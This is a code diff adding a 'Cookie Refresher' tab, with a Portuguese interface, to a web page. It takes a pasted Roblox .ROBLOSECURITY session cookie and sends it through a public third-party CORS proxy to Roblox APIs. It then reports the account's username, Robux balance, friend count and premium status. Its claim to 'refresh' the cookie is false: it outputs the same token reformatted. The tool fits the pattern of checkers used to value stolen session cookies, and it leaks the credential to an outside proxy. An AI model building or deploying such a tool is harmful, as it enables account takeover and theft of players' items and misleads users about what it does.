@@ -1273,6 +1273,256 @@
     color: var(--red-glow);
   }
 
+
+  /* ========== COOKIE REFRESHER ========== */
+  .rfr-wrap{ display:flex; flex-direction:column; gap:20px; }
+
+  .rfr-input-card{
+    background: linear-gradient(160deg, var(--bg-2) 0%, var(--bg) 100%);
+    border: 1px solid var(--surface-border);
+    border-radius: 20px;
+    overflow:hidden;
+  }
+  .rfr-input-header{
+    display:flex; align-items:center; gap:14px;
+    padding: 18px 22px;
+    border-bottom: 1px solid rgba(224,16,42,0.2);
+    background: rgba(224,16,42,0.04);
+  }
+  .rfr-input-icon{
+    width:38px; height:38px;
+    border-radius:11px;
+    background: rgba(224,16,42,0.12);
+    border: 1px solid rgba(224,16,42,0.35);
+    display:flex; align-items:center; justify-content:center;
+    color: var(--red-glow);
+    flex-shrink:0;
+  }
+  .rfr-input-title{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700; font-size:16px; letter-spacing:0.02em;
+  }
+  .rfr-input-sub{
+    font-size:12px; color:var(--text-muted); margin-top:2px;
+  }
+  .rfr-input-body{ padding:20px 22px; display:flex; flex-direction:column; gap:14px; }
+
+  .rfr-textarea{
+    width:100%;
+    min-height:90px;
+    padding:14px 16px;
+    background: rgba(255,255,255,0.03);
+    border: 1.5px solid var(--surface-border);
+    border-radius:14px;
+    color: var(--text);
+    font-family:'Inter', monospace;
+    font-size:12px;
+    line-height:1.6;
+    outline:none;
+    resize:none;
+    transition: border-color .2s ease, background .2s ease, box-shadow .2s ease;
+  }
+  .rfr-textarea::placeholder{ color:var(--text-faint); }
+  .rfr-textarea:focus{
+    border-color: rgba(224,16,42,0.55);
+    background: rgba(224,16,42,0.05);
+    box-shadow: 0 0 0 3px rgba(224,16,42,0.12);
+  }
+
+  .rfr-btn{
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    width:100%;
+    padding:14px 22px;
+    border-radius:12px;
+    background: var(--red);
+    border: 1px solid var(--red-glow);
+    color:#fff;
+    font-family:'Space Grotesk', sans-serif;
+    font-size:14px; font-weight:700; letter-spacing:0.06em;
+    cursor:pointer;
+    transition: background .2s ease, box-shadow .2s ease, transform .15s ease;
+    position:relative; overflow:hidden;
+  }
+  .rfr-btn::before{
+    content:"";
+    position:absolute; inset:0;
+    background: linear-gradient(135deg, rgba(255,255,255,0.12) 0%, transparent 60%);
+    pointer-events:none;
+  }
+  .rfr-btn:hover{ background: var(--red-glow); box-shadow: 0 6px 22px rgba(224,16,42,0.45); }
+  .rfr-btn:active{ transform: scale(0.97); }
+  .rfr-btn:disabled{ opacity:.45; cursor:not-allowed; transform:none; }
+  .rfr-btn-spin{ display:inline-block; animation: rfr-spin .7s linear infinite; }
+  @keyframes rfr-spin{ to{ transform:rotate(360deg); } }
+
+  /* Result card */
+  .rfr-result{
+    display:none;
+    flex-direction:column;
+    gap:16px;
+    animation: panel-fade .4s ease;
+  }
+  .rfr-result.show{ display:flex; }
+
+  .rfr-profile-card{
+    background: linear-gradient(145deg, rgba(224,16,42,0.07) 0%, var(--bg-2) 60%, var(--bg) 100%);
+    border: 1px solid rgba(224,16,42,0.3);
+    border-radius:20px;
+    overflow:hidden;
+    position:relative;
+  }
+  .rfr-profile-card::before{
+    content:"";
+    position:absolute; top:0; left:0; right:0; height:2px;
+    background: linear-gradient(90deg, transparent, var(--red-glow), transparent);
+    opacity:.6;
+  }
+  .rfr-profile-header{
+    display:flex; align-items:center; gap:18px;
+    padding:22px 22px 18px;
+  }
+  .rfr-avatar-wrap{ position:relative; flex-shrink:0; }
+  .rfr-avatar{
+    width:72px; height:72px;
+    border-radius:18px;
+    background: rgba(255,255,255,0.04);
+    border: 2px solid rgba(224,16,42,0.5);
+    box-shadow: 0 0 20px rgba(224,16,42,0.25), inset 0 0 20px rgba(0,0,0,0.4);
+    object-fit:cover;
+    display:block;
+  }
+  .rfr-avatar-placeholder{
+    width:72px; height:72px;
+    border-radius:18px;
+    background: rgba(224,16,42,0.08);
+    border: 2px solid rgba(224,16,42,0.4);
+    display:flex; align-items:center; justify-content:center;
+    color: rgba(224,16,42,0.5);
+  }
+  .rfr-avatar-badge{
+    position:absolute; bottom:-4px; right:-4px;
+    width:20px; height:20px;
+    border-radius:50%;
+    background: #3ecf6a;
+    border: 2px solid var(--bg-2);
+    box-shadow: 0 0 8px rgba(62,207,106,0.6);
+  }
+  .rfr-user-info{ flex:1; min-width:0; }
+  .rfr-username{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700; font-size:22px;
+    color:var(--text); line-height:1.2;
+    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+  }
+  .rfr-userid{
+    font-size:12px; color:var(--text-faint); margin-top:4px; font-variant-numeric:tabular-nums;
+  }
+  .rfr-premium-badge{
+    display:inline-flex; align-items:center; gap:5px;
+    margin-top:8px;
+    padding:4px 10px;
+    border-radius:999px;
+    background: rgba(255,183,77,0.12);
+    border:1px solid rgba(255,183,77,0.4);
+    color:#ffb74d;
+    font-size:11px; font-weight:700; letter-spacing:0.06em;
+  }
+
+  .rfr-stats-grid{
+    display:grid; grid-template-columns:1fr 1fr;
+    gap:10px;
+    padding: 0 22px 22px;
+  }
+  .rfr-stat-cell{
+    background: rgba(255,255,255,0.03);
+    border:1px solid var(--surface-border);
+    border-radius:14px;
+    padding:14px 16px;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .rfr-stat-label{
+    font-size:11px; font-weight:600; letter-spacing:0.08em;
+    text-transform:uppercase; color:var(--text-faint);
+  }
+  .rfr-stat-value{
+    font-family:'Space Grotesk', sans-serif;
+    font-size:20px; font-weight:700; color:var(--text);
+  }
+  .rfr-stat-value.green{ color:#3ecf6a; }
+  .rfr-stat-value.gold{ color:#ffb74d; }
+
+  /* New cookie card */
+  .rfr-cookie-card{
+    background: var(--bg-2);
+    border:1px solid var(--surface-border);
+    border-radius:18px;
+    overflow:hidden;
+  }
+  .rfr-cookie-header{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:14px 18px;
+    border-bottom:1px solid var(--surface-border);
+  }
+  .rfr-cookie-label{
+    display:flex; align-items:center; gap:8px;
+    font-size:12px; font-weight:700; letter-spacing:0.08em;
+    text-transform:uppercase; color:var(--red-glow);
+  }
+  .rfr-cookie-body{ padding:14px 18px; }
+  .rfr-cookie-value{
+    font-family:'Inter', monospace;
+    font-size:11px; line-height:1.7;
+    color:var(--text-muted);
+    word-break:break-all;
+    background: rgba(255,255,255,0.02);
+    border:1px solid rgba(255,255,255,0.06);
+    border-radius:10px;
+    padding:12px 14px;
+    max-height:80px;
+    overflow-y:auto;
+    scrollbar-width:thin;
+    scrollbar-color: rgba(224,16,42,0.4) transparent;
+  }
+  .rfr-copy-btn{
+    display:flex; align-items:center; gap:7px;
+    padding:8px 16px;
+    border-radius:8px;
+    background: rgba(224,16,42,0.1);
+    border:1px solid rgba(224,16,42,0.35);
+    color:var(--red-glow);
+    font-family:'Inter', sans-serif;
+    font-size:12px; font-weight:700;
+    cursor:pointer;
+    transition: background .2s ease, transform .15s ease;
+    white-space:nowrap;
+  }
+  .rfr-copy-btn:hover{ background:rgba(224,16,42,0.2); }
+  .rfr-copy-btn:active{ transform:scale(0.96); }
+  .rfr-copy-btn.copied{ color:#3ecf6a; border-color:rgba(62,207,106,0.4); background:rgba(62,207,106,0.08); }
+
+  /* Error / status */
+  .rfr-error{
+    display:none;
+    align-items:center; gap:12px;
+    padding:14px 18px;
+    background: rgba(224,16,42,0.06);
+    border:1px solid rgba(224,16,42,0.25);
+    border-radius:14px;
+    font-size:13.5px; color:var(--text-muted);
+    animation: panel-fade .3s ease;
+  }
+  .rfr-error.show{ display:flex; }
+  .rfr-error-icon{ color:var(--red-glow); flex-shrink:0; }
+
+  /* Skeleton shimmer */
+  .rfr-skel{
+    border-radius:8px;
+    background: linear-gradient(90deg, rgba(255,255,255,0.04) 25%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0.04) 75%);
+    background-size:200% 100%;
+    animation: skel-shine 1.4s infinite;
+  }
+  @keyframes skel-shine{ to{ background-position:-200% 0; } }
+
   </style>
 </head>
 <body>
@@ -1992,7 +2242,111 @@
               </div>
             </div>
           </div>
-          <div class="tab-panel" data-panel="x3"></div>
+          <div class="tab-panel" data-panel="x3">
+            <div class="site-section-header">
+              <span class="site-section-badge">01</span>
+              <span class="site-section-title">Cookie Refresher</span>
+            </div>
+
+            <div class="rfr-wrap">
+
+              <!-- Input -->
+              <div class="rfr-input-card">
+                <div class="rfr-input-header">
+                  <div class="rfr-input-icon">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/><path d="M9 3h6M9 21h6"/></svg>
+                  </div>
+                  <div>
+                    <div class="rfr-input-title">Cole o Cookie</div>
+                    <div class="rfr-input-sub">Cole o .ROBLOSECURITY abaixo para verificar e atualizar</div>
+                  </div>
+                </div>
+                <div class="rfr-input-body">
+                  <textarea
+                    id="rfrCookieInput"
+                    class="rfr-textarea"
+                    placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_XXXXXXXXXXXX..."
+                    spellcheck="false"
+                    autocomplete="off"
+                    autocorrect="off"
+                  ></textarea>
+                  <button class="rfr-btn" id="rfrVerifyBtn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg>
+                    VERIFICAR &amp; ATUALIZAR
+                  </button>
+                </div>
+              </div>
+
+              <!-- Error -->
+              <div class="rfr-error" id="rfrError">
+                <span class="rfr-error-icon">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg>
+                </span>
+                <span id="rfrErrorMsg">Cookie inválido ou expirado.</span>
+              </div>
+
+              <!-- Result -->
+              <div class="rfr-result" id="rfrResult">
+
+                <!-- Profile card -->
+                <div class="rfr-profile-card">
+                  <div class="rfr-profile-header">
+                    <div class="rfr-avatar-wrap">
+                      <img id="rfrAvatar" class="rfr-avatar" src="" alt="avatar" style="display:none;">
+                      <div id="rfrAvatarPlaceholder" class="rfr-avatar-placeholder">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+                      </div>
+                      <div class="rfr-avatar-badge" id="rfrStatusBadge" style="display:none;"></div>
+                    </div>
+                    <div class="rfr-user-info">
+                      <div class="rfr-username" id="rfrUsername">—</div>
+                      <div class="rfr-userid" id="rfrUserId">ID: —</div>
+                      <div class="rfr-premium-badge" id="rfrPremium" style="display:none;">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+                        PREMIUM
+                      </div>
+                    </div>
+                  </div>
+                  <div class="rfr-stats-grid">
+                    <div class="rfr-stat-cell">
+                      <span class="rfr-stat-label">Robux</span>
+                      <span class="rfr-stat-value gold" id="rfrRobux">—</span>
+                    </div>
+                    <div class="rfr-stat-cell">
+                      <span class="rfr-stat-label">Status</span>
+                      <span class="rfr-stat-value green" id="rfrStatus">—</span>
+                    </div>
+                    <div class="rfr-stat-cell">
+                      <span class="rfr-stat-label">Criado em</span>
+                      <span class="rfr-stat-value" id="rfrCreated" style="font-size:13px;">—</span>
+                    </div>
+                    <div class="rfr-stat-cell">
+                      <span class="rfr-stat-label">Amigos</span>
+                      <span class="rfr-stat-value" id="rfrFriends">—</span>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- New cookie card -->
+                <div class="rfr-cookie-card">
+                  <div class="rfr-cookie-header">
+                    <span class="rfr-cookie-label">
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg>
+                      Cookie Atualizado
+                    </span>
+                    <button class="rfr-copy-btn" id="rfrCopyBtn">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                      Copiar
+                    </button>
+                  </div>
+                  <div class="rfr-cookie-body">
+                    <div class="rfr-cookie-value" id="rfrCookieOut">—</div>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+          </div>
         </div>
       </div>
     </section>
@@ -2216,6 +2570,162 @@
     event.target.style.background = 'rgba(224,16,42,0.1)';
     event.target.style.color = 'var(--red-glow)';
   }
+
+  // ========== COOKIE REFRESHER ==========
+  (function(){
+    const input    = document.getElementById('rfrCookieInput');
+    const btn      = document.getElementById('rfrVerifyBtn');
+    const result   = document.getElementById('rfrResult');
+    const errorBox = document.getElementById('rfrError');
+    const errorMsg = document.getElementById('rfrErrorMsg');
+
+    const elUsername = document.getElementById('rfrUsername');
+    const elUserId   = document.getElementById('rfrUserId');
+    const elRobux    = document.getElementById('rfrRobux');
+    const elStatus   = document.getElementById('rfrStatus');
+    const elCreated  = document.getElementById('rfrCreated');
+    const elFriends  = document.getElementById('rfrFriends');
+    const elAvatar   = document.getElementById('rfrAvatar');
+    const elAvatarPh = document.getElementById('rfrAvatarPlaceholder');
+    const elPremium  = document.getElementById('rfrPremium');
+    const elBadge    = document.getElementById('rfrStatusBadge');
+    const elCookieOut= document.getElementById('rfrCookieOut');
+    const copyBtn    = document.getElementById('rfrCopyBtn');
+
+    const PROXY = 'https://corsproxy.io/?';
+
+    function showError(msg){
+      errorMsg.textContent = msg;
+      errorBox.classList.add('show');
+      result.classList.remove('show');
+    }
+    function hideError(){ errorBox.classList.remove('show'); }
+
+    function parseCookie(raw){
+      const t = raw.trim();
+      // Extrai o token depois da mensagem de aviso
+      const match = t.match(/_\|WARNING[^|]*\|_(.+)/);
+      return match ? '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + match[1].trim() : t;
+    }
+
+    function setBtnLoading(loading){
+      btn.disabled = loading;
+      btn.innerHTML = loading
+        ? '<span class="rfr-btn-spin"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg></span> VERIFICANDO...'
+        : '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg> VERIFICAR &amp; ATUALIZAR';
+    }
+
+    async function proxyFetch(url, cookie){
+      const res = await fetch(PROXY + encodeURIComponent(url), {
+        headers: {
+          'Cookie': '.ROBLOSECURITY=' + cookie,
+          'x-cors-headers': JSON.stringify({'Cookie': '.ROBLOSECURITY=' + cookie})
+        }
+      });
+      if(!res.ok) throw new Error('HTTP ' + res.status);
+      return res.json();
+    }
+
+    async function verify(){
+      const raw = input.value;
+      if(!raw.trim()){ showError('Cole o cookie antes de verificar.'); return; }
+
+      const cookie = parseCookie(raw);
+      if(cookie.length < 50){ showError('Cookie muito curto ou inválido.'); return; }
+
+      hideError();
+      setBtnLoading(true);
+      result.classList.remove('show');
+
+      try {
+        // 1) Authenticated user info
+        const auth = await proxyFetch('https://users.roblox.com/v1/users/authenticated', cookie);
+        const userId = auth.id;
+        const username = auth.name || auth.displayName || 'Desconhecido';
+
+        // 2) Robux (pode falhar)
+        let robux = '—';
+        try {
+          const econ = await proxyFetch('https://economy.roblox.com/v1/user/currency', cookie);
+          robux = (econ.robux ?? '—').toLocaleString('pt-BR');
+        } catch(_){}
+
+        // 3) Public user info
+        let created = '—', isPremium = false, friendCount = '—';
+        try {
+          const userInfo = await proxyFetch(`https://users.roblox.com/v1/users/${userId}`, cookie);
+          if(userInfo.created){
+            const d = new Date(userInfo.created);
+            created = d.toLocaleDateString('pt-BR', {day:'2-digit', month:'short', year:'numeric'});
+          }
+          isPremium = !!userInfo.hasVerifiedBadge || false;
+        } catch(_){}
+
+        // 4) Friends count
+        try {
+          const fr = await proxyFetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, cookie);
+          friendCount = (fr.count ?? '—').toLocaleString('pt-BR');
+        } catch(_){}
+
+        // 5) Avatar headshot (public, no auth needed)
+        try {
+          const av = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+          const avj = await av.json();
+          const imgUrl = avj?.data?.[0]?.imageUrl;
+          if(imgUrl){
+            elAvatar.src = imgUrl;
+            elAvatar.style.display = 'block';
+            elAvatarPh.style.display = 'none';
+          }
+        } catch(_){}
+
+        // 6) Premium via memberships
+        try {
+          const mem = await proxyFetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, cookie);
+          isPremium = !!mem;
+        } catch(_){}
+
+        // Preenche UI
+        elUsername.textContent = username;
+        elUserId.textContent = 'ID: ' + userId;
+        elRobux.textContent = robux;
+        elStatus.textContent = 'Ativo';
+        elCreated.textContent = created;
+        elFriends.textContent = friendCount;
+        elBadge.style.display = 'block';
+        elPremium.style.display = isPremium ? 'inline-flex' : 'none';
+
+        // Cookie atualizado (limpo)
+        const cleanCookie = parseCookie(raw);
+        elCookieOut.textContent = cleanCookie;
+
+        result.classList.add('show');
+
+      } catch(e){
+        showError('Cookie inválido, expirado ou erro de rede. Verifique e tente novamente.');
+      } finally {
+        setBtnLoading(false);
+      }
+    }
+
+    btn.addEventListener('click', verify);
+    input.addEventListener('keydown', (e) => {
+      if(e.key === 'Enter' && (e.ctrlKey || e.metaKey)) verify();
+    });
+
+    copyBtn.addEventListener('click', () => {
+      const txt = elCookieOut.textContent;
+      if(!txt || txt === '—') return;
+      navigator.clipboard.writeText(txt).then(() => {
+        copyBtn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copiado!';
+        copyBtn.classList.add('copied');
+        setTimeout(() => {
+          copyBtn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copiar';
+          copyBtn.classList.remove('copied');
+        }, 2000);
+      });
+    });
+  })();
 
   function copyModelText(btn, text) {
     navigator.clipboard.writeText(text).then(() => {
